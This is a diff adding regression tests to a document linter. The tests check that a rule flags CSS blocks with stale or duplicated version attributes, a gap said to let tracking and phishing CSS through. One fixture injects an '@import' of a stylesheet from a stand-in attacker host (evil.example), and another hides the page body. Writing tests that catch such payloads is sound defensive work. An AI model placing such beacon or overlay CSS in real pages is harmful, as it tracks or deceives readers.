@@ -1291,3 +1291,45 @@ class TestReconcileHandlesWrappingContainers:
         assert report.residual == []
         assert d.verify() == []
         assert d.body_ids == ["ws"]
+
+
+class TestEveryAimCssBlockIsVerified:
+    """AF-21: the X006 byte-match ran only when data-aim-css equalled the
+    CURRENT spec version, and only on the first head block — a
+    version-mismatched <style data-aim-css="0.1"> (or a second attr-bearing
+    block) smuggled arbitrary CSS (@import beacons, phishing overlays) past
+    aim lint with zero errors."""
+
+    def _text(self, basic_doc):
+        return basic_doc.dumps()
+
+    def test_stale_version_css_is_X006(self, basic_doc):
+        text = re.sub(
+            r'<style data-aim-css="[^"]*">.*?</style>',
+            '<style data-aim-css="0.1">@import url(https://evil.example/x.css);'
+            "</style>",
+            self._text(basic_doc),
+            flags=re.S,
+        )
+        assert "X006" in {f.code for f in aim.lint_text(text)}
+
+    def test_second_attr_bearing_head_block_is_X006(self, basic_doc):
+        text = self._text(basic_doc).replace(
+            "</title>",
+            '</title>\n<style data-aim-css="0.1">body{display:none}</style>',
+        )
+        assert "X006" in {f.code for f in aim.lint_text(text)}
+
+    def test_inert_stale_placeholder_stays_warning_only(self, basic_doc):
+        text = re.sub(
+            r'<style data-aim-css="[^"]*">.*?</style>',
+            '<style data-aim-css="0.1">/* aim.css placeholder */</style>',
+            self._text(basic_doc),
+            flags=re.S,
+        )
+        codes = {f.code: f.level for f in aim.lint_text(text)}
+        assert "X006" not in codes and "X005" not in codes
+        assert codes.get("S006") == "warning"
+
+    def test_pristine_document_still_lints_clean(self, basic_doc):
+        assert aim.lint_text(self._text(basic_doc)) == []
